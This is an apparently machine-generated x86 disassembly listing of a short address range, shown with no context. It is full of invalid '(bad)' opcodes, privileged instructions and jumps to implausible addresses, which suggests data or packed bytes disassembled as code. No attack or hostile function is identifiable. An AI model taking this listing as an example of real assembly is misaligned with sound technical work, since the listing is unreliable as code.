  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
